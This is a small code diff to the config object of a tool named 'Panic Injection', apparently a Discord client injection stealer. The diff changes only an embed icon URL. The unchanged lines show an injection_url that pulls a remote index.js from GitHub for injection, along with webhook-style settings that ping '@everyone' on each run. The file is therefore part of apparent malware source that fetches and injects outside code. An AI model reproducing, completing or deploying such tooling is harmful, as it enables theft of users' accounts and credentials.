@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Panic Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/imsolve/Panic/main/img/panic.png'.replace(/ /g, '%20'), 
+  embed_icon: 'https://raw.githubusercontent.com/imsolve/Panic/main/pfp/panic.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/imsolve/Panic-injection/main/index.js', 
   /**
